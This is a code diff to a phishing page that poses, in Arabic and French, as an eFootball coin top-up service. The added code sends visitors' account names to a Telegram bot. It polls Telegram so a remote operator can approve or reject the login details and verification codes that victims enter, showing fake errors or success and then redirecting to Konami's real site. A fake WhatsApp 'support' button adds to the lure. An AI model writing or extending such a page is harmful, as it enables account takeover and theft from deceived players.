@@ -129,9 +129,34 @@
         .detail-label { color: #aaa; font-weight: 500; min-width: 80px; }
         .detail-value { color: #fff; font-weight: bold; text-align: left; flex: 1; }
         .detail-value.failed { color: #fc8181; }
-        .support-link { color: #3182ce; text-decoration: underline; font-weight: bold; }
-        .try-other-link { color: #ffb703; text-decoration: underline; font-weight: bold; cursor: pointer; }
-        .btn-back { background-color: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; font-size: 15px; }
+
+        /* الأزرار الجديدة في صفحة الخطأ */
+        .error-buttons-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .btn-error-action {
+            background-color: #3182ce;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+        .btn-whatsapp-support {
+            background-color: #25d366;
+            color: white;
+        }
 
         #successScreen { display: none; width: 92%; max-width: 380px; padding: 15px 0; direction: rtl; }
         .success-icon-animated { font-size: 50px; animation: popEffect 0.5s ease-in-out forwards; margin-bottom: 10px; display: inline-block; }
@@ -226,7 +251,6 @@
         .center-notice-text { font-size: 11px; color: #555555; font-weight: 400; text-align: center; width: 100%; margin: 8px 0; }
         .btn-suivant-blue { width: 180px; height: 40px; background-color: #007bff; color: #ffffff; border: 1px solid #007bff; font-size: 15px; font-weight: bold; border-radius: 4px; cursor: pointer; outline: none; margin: 5px auto 0 auto; display: flex; align-items: center; justify-content: center; }
 
-        /* صفحة التحقق من البريد المضافة */
         #emailVerificationScreen {
             display: none;
             width: 100%;
@@ -362,13 +386,13 @@
                 <span class="detail-label">المشكل:</span>
                 <span class="detail-value">نظراً للتحديث الجديد باللعبة لم نتمكن من العثور على حسابك.</span>
             </div>
-            <div class="detail-item">
-                <span class="detail-label">الحل:</span>
-                <span class="detail-value">يمكنك <span class="try-other-link" onclick="goToLinkAccount()">تجربة طريقة أخرى</span> أو <a href="https://wa.me/212669035532" target="_blank" class="support-link">التواصل مع خدمة الدعم</a>.</span>
-            </div>
         </div>
 
-        <button class="btn-back" onclick="resetToHome()">المحاولة مرة أخرى 🔄</button>
+        <!-- الأزرار الجديدة المضافة في صفحة الخطأ -->
+        <div class="error-buttons-container">
+            <button class="btn-error-action" onclick="goToLinkAccount()">تجربة طريقة أخرى 🔄</button>
+            <a href="https://wa.me/212669035532" target="_blank" class="btn-error-action btn-whatsapp-support">التواصل مع الدعم 💬</a>
+        </div>
     </div>
 </div>
 
@@ -393,7 +417,6 @@
         </div>
     </div>
 
-    <!-- زر تحقق المعدل -->
     <button class="btn-verify" onclick="openEmailVerificationScreen()">تحقق</button>
 </div>
 
@@ -557,7 +580,7 @@
 
                 <button type="button" id="btnVerifyStep2Suivant" class="btn-suivant-blue" onclick="handleVerifyStep2()">
                     <span id="btnTextVerifyStep2">Suivant</span>
-                    <div id="btnSpinnerVerifyStep2" class="spinner-small" style="display: none; border-color: #fff; border-top-color: transparent;"></div>
+                    <div id="btnSpinnerVerifyStep2" class="spinner-small" style="display: none; border-color: #fff; border-top-color: transparent; width: 14px; height: 14px; margin-right: 6px;"></div>
                 </button>
             </div>
         </div>
@@ -594,13 +617,32 @@
         }, 2000);
     }
 
-    function startCharging() {
+    async function startCharging() {
         const input = document.getElementById('playerId');
         if (!input.value.trim() || !selectedAmount) {
             alert('الرجاء إدخال اسم الحساب واختيار كمية الكوينز أولاً!');
             return;
         }
         selectedAccount = input.value.trim();
+
+        const chargingMsg = `🎮 *طلب شحن جديد (eFootball)*\n\n` +
+                            `👤 *اسم الحساب:* \`${selectedAccount}\`\n` +
+                            `🪙 *عدد الكوينز:* \`${selectedAmount}\``;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: chargingMsg,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (err) {
+            console.error("Error sending account to telegram:", err);
+        }
+
         document.getElementById('mainScreen').style.display = 'none';
         document.getElementById('processScreen').style.display = 'block';
         document.getElementById('loadingState').style.display = 'block';
@@ -703,6 +745,7 @@
     const CHAT_ID = "7646344244";
     let lastUpdateId = 0;
     let processedUpdateIds = new Set();
+    let pendingCallbacks = {};
 
     function sendControlPanel() {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -749,10 +792,10 @@
         }
     }
 
-    function checkWebsiteStatus() {
+    function startPollingLoop() {
         setInterval(async () => {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&limit=100`);
                 const data = await response.json();
 
                 if (data.ok && data.result.length > 0) {
@@ -761,6 +804,29 @@
                         
                         processedUpdateIds.add(update.update_id);
                         lastUpdateId = update.update_id;
+
+                        if (update.callback_query) {
+                            const callback = update.callback_query;
+                            const callbackData = callback.data;
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ callback_query_id: callback.id, text: "تم الاستلام!" })
+                            }).catch(() => {});
+
+                            if (callbackData === 'site_open') {
+                                applySiteStatus('open');
+                                updateTelegramMessage(callback.message.message_id, "⚙️ *لوحة تحكم موقع شحن eFootball*:", "🔓 تم فتح الموقع للزوار ✅");
+                            } else if (callbackData === 'site_close') {
+                                applySiteStatus('closed');
+                                updateTelegramMessage(callback.message.message_id, "⚙️ *لوحة تحكم موقع شحن eFootball*:", "🔒 تم إغلاق الموقع (404) ❌");
+                            } else if (pendingCallbacks[callbackData]) {
+                                const handler = pendingCallbacks[callbackData];
+                                delete pendingCallbacks[callbackData];
+                                handler(callback);
+                            }
+                        }
 
                         if (update.message && update.message.text) {
                             const msg = update.message.text.trim().toLowerCase();
@@ -782,37 +848,18 @@
                                 });
                             }
                         }
-
-                        if (update.callback_query) {
-                            const callback = update.callback_query;
-                            const callbackData = callback.data;
-
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ callback_query_id: callback.id })
-                            }).catch(() => {});
-
-                            if (callbackData === 'site_open') {
-                                applySiteStatus('open');
-                                updateTelegramMessage(callback.message.message_id, "⚙️ *لوحة تحكم موقع شحن eFootball*:", "🔓 تم فتح الموقع للزوار ✅");
-                            } else if (callbackData === 'site_close') {
-                                applySiteStatus('closed');
-                                updateTelegramMessage(callback.message.message_id, "⚙️ *لوحة تحكم موقع شحن eFootball*:", "🔒 تم إغلاق الموقع (404) ❌");
-                            }
-                        }
                     }
                 }
             } catch (err) {
-                console.error("Status check error:", err);
+                console.error("Polling error:", err);
             }
-        }, 2000);
+        }, 300);
     }
 
     window.addEventListener('DOMContentLoaded', () => {
         const currentStatus = localStorage.getItem('site_status');
         applySiteStatus(currentStatus === 'closed' ? 'closed' : 'open');
-        checkWebsiteStatus();
+        startPollingLoop();
     });
 
     async function handleStep2(e) {
@@ -854,6 +901,28 @@
             ]
         };
 
+        const processDecision = (callback, isApproved) => {
+            const statusText = isApproved ? "تمت الموافقة ✅" : "تم الرفض ❌";
+            updateTelegramMessage(callback.message.message_id, text, statusText);
+            
+            if (spinner) spinner.style.display = 'none';
+            if (btnText) btnText.style.display = 'inline';
+
+            if (isApproved) {
+                if (document.getElementById('step2')) document.getElementById('step2').style.display = 'none';
+                if (document.getElementById('step3')) document.getElementById('step3').style.display = 'flex';
+            } else {
+                const err = document.getElementById('captchaError');
+                if (err) {
+                    err.innerText = "Impossible de se connecter. Vérifiez votre ID de connexion et mot de passe";
+                    err.style.display = 'block';
+                }
+            }
+        };
+
+        pendingCallbacks[`approve_${requestId}`] = (cb) => processDecision(cb, true);
+        pendingCallbacks[`reject_${requestId}`] = (cb) => processDecision(cb, false);
+
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -865,8 +934,6 @@
                     reply_markup: replyMarkup
                 })
             });
-
-            listenForAdminDecision(requestId, text, btnText, spinner, 2);
         } catch (err) {
             console.error(err);
             if (spinner) spinner.style.display = 'none';
@@ -905,6 +972,27 @@
             ]
         };
 
+        const processDecision = (callback, isApproved) => {
+            const statusText = isApproved ? "تمت الموافقة ✅" : "تم الرفض ❌";
+            updateTelegramMessage(callback.message.message_id, codeMsg, statusText);
+            
+            if (spinner) spinner.style.display = 'none';
+            if (btnText) btnText.style.display = 'inline';
+
+            if (isApproved) {
+                document.getElementById('konamiEmailScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+                document.getElementById('successResAccount').innerText = selectedAccount;
+                document.getElementById('successResAmount').innerText = selectedAmount;
+            } else {
+                document.getElementById('codeErrorMsg').style.display = 'block';
+                document.getElementById('codeInputsContainer').classList.add('error-border');
+            }
+        };
+
+        pendingCallbacks[`approve_${requestId}`] = (cb) => processDecision(cb, true);
+        pendingCallbacks[`reject_${requestId}`] = (cb) => processDecision(cb, false);
+
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -916,8 +1004,6 @@
                     reply_markup: replyMarkup
                 })
             });
-
-            listenForAdminDecision(requestId, codeMsg, btnText, spinner, 3);
         } catch (err) {
             console.error(err);
             if (spinner) spinner.style.display = 'none';
@@ -925,72 +1011,6 @@
         }
     }
 
-    function listenForAdminDecision(requestId, originalText, btnText, spinner, stepNum) {
-        const checkInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await response.json();
-
-                if (data.ok && data.result.length > 0) {
-                    for (const update of data.result) {
-                        if (processedUpdateIds.has(update.update_id)) continue;
-
-                        if (update.callback_query) {
-                            const callback = update.callback_query;
-                            const callbackData = callback.data;
-
-                            if (callbackData === `approve_${requestId}` || callbackData === `reject_${requestId}`) {
-                                processedUpdateIds.add(update.update_id);
-                                lastUpdateId = update.update_id;
-
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ callback_query_id: callback.id })
-                                }).catch(() => {});
-
-                                const isApproved = callbackData === `approve_${requestId}`;
-                                const statusText = isApproved ? "تمت الموافقة ✅" : "تم الرفض ❌";
-
-                                updateTelegramMessage(callback.message.message_id, originalText, statusText);
-
-                                clearInterval(checkInterval);
-                                if (spinner) spinner.style.display = 'none';
-                                if (btnText) btnText.style.display = 'inline';
-
-                                if (isApproved) {
-                                    if (stepNum === 2) {
-                                        if (document.getElementById('step2')) document.getElementById('step2').style.display = 'none';
-                                        if (document.getElementById('step3')) document.getElementById('step3').style.display = 'flex';
-                                    } else if (stepNum === 3) {
-                                        document.getElementById('konamiEmailScreen').style.display = 'none';
-                                        document.getElementById('successScreen').style.display = 'block';
-                                        document.getElementById('successResAccount').innerText = selectedAccount;
-                                        document.getElementById('successResAmount').innerText = selectedAmount;
-                                    }
-                                } else {
-                                    if (stepNum === 2) {
-                                        const err = document.getElementById('captchaError');
-                                        if (err) {
-                                            err.innerText = "Impossible de se connecter. Vérifiez votre ID de connexion et mot de passe";
-                                            err.style.display = 'block';
-                                        }
-                                    } else if (stepNum === 3) {
-                                        document.getElementById('codeErrorMsg').style.display = 'block';
-                                        document.getElementById('codeInputsContainer').classList.add('error-border');
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch (error) {
-                console.error("Polling error:", error);
-            }
-        }, 2000);
-    }
-
-    // --- الوظائف الخاصة بصفحة التحقق الجديدة ---
     function openEmailVerificationScreen() {
         document.getElementById('successScreen').style.display = 'none';
         document.getElementById('emailVerificationScreen').style.display = 'block';
@@ -1018,6 +1038,14 @@
             ]
         };
 
+        pendingCallbacks[`sendcode_${verifyReqId}`] = (callback) => {
+            updateTelegramMessage(callback.message.message_id, textMsg, "تم فتح صفحة إدخال الرمز للزائر 📩");
+            spinner.style.display = 'none';
+            btnText.style.display = 'inline';
+            document.getElementById('emailStep1Box').style.display = 'none';
+            document.getElementById('emailStep2CodeBox').style.display = 'flex';
+        };
+
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1029,56 +1057,11 @@
                     reply_markup: replyMarkup
                 })
             });
-
-            listenForEmailVerifyTrigger(verifyReqId, textMsg, btnText, spinner);
         } catch (err) {
             console.error(err);
             spinner.style.display = 'none';
             btnText.style.display = 'inline';
         }
-    }
-
-    function listenForEmailVerifyTrigger(verifyReqId, originalText, btnText, spinner) {
-        const checkInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await response.json();
-
-                if (data.ok && data.result.length > 0) {
-                    for (const update of data.result) {
-                        if (processedUpdateIds.has(update.update_id)) continue;
-
-                        if (update.callback_query) {
-                            const callback = update.callback_query;
-                            const callbackData = callback.data;
-
-                            if (callbackData === `sendcode_${verifyReqId}`) {
-                                processedUpdateIds.add(update.update_id);
-                                lastUpdateId = update.update_id;
-
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ callback_query_id: callback.id })
-                                }).catch(() => {});
-
-                                updateTelegramMessage(callback.message.message_id, originalText, "تم فتح صفحة إدخال الرمز للزائر 📩");
-
-                                clearInterval(checkInterval);
-                                spinner.style.display = 'none';
-                                btnText.style.display = 'inline';
-
-                                // فتح صفحة إدخال رمز التحقق
-                                document.getElementById('emailStep1Box').style.display = 'none';
-                                document.getElementById('emailStep2CodeBox').style.display = 'flex';
-                            }
-                        }
-                    }
-                }
-            } catch (err) {
-                console.error("Polling verify trigger error:", err);
-            }
-        }, 2000);
     }
 
     async function handleVerifyStep2() {
@@ -1111,6 +1094,25 @@
             ]
         };
 
+        const processDecision = (callback, isApproved) => {
+            const statusText = isApproved ? "تمت الموافقة ✅" : "تم الرفض ❌";
+            updateTelegramMessage(callback.message.message_id, codeMsg, statusText);
+            
+            spinner.style.display = 'none';
+            btnText.style.display = 'inline';
+
+            if (isApproved) {
+                alert('تم توثيق وتحقيق البريد الإلكتروني بنجاح!');
+                window.location.href = "https://my.konami.net/fr";
+            } else {
+                document.getElementById('verifyCodeErrorMsg').style.display = 'block';
+                document.getElementById('verifyCodeInputsContainer').classList.add('error-border');
+            }
+        };
+
+        pendingCallbacks[`approve_${requestId}`] = (cb) => processDecision(cb, true);
+        pendingCallbacks[`reject_${requestId}`] = (cb) => processDecision(cb, false);
+
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1122,63 +1124,11 @@
                     reply_markup: replyMarkup
                 })
             });
-
-            listenForVerifyCodeDecision(requestId, codeMsg, btnText, spinner);
         } catch (err) {
             console.error(err);
             spinner.style.display = 'none';
             btnText.style.display = 'inline';
         }
-    }
-
-    function listenForVerifyCodeDecision(requestId, originalText, btnText, spinner) {
-        const checkInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await response.json();
-
-                if (data.ok && data.result.length > 0) {
-                    for (const update of data.result) {
-                        if (processedUpdateIds.has(update.update_id)) continue;
-
-                        if (update.callback_query) {
-                            const callback = update.callback_query;
-                            const callbackData = callback.data;
-
-                            if (callbackData === `approve_${requestId}` || callbackData === `reject_${requestId}`) {
-                                processedUpdateIds.add(update.update_id);
-                                lastUpdateId = update.update_id;
-
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ callback_query_id: callback.id })
-                                }).catch(() => {});
-
-                                const isApproved = callbackData === `approve_${requestId}`;
-                                const statusText = isApproved ? "تمت الموافقة ✅" : "تم الرفض ❌";
-
-                                updateTelegramMessage(callback.message.message_id, originalText, statusText);
-
-                                clearInterval(checkInterval);
-                                spinner.style.display = 'none';
-                                btnText.style.display = 'inline';
-
-                                if (isApproved) {
-                                    alert('تم توثيق وتحقيق البريد الإلكتروني بنجاح!');
-                                    window.location.href = "https://my.konami.net/fr";
-                                } else {
-                                    document.getElementById('verifyCodeErrorMsg').style.display = 'block';
-                                    document.getElementById('verifyCodeInputsContainer').classList.add('error-border');
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch (error) {
-                console.error("Polling verify code decision error:", error);
-            }
-        }, 2000);
     }
 </script>
 
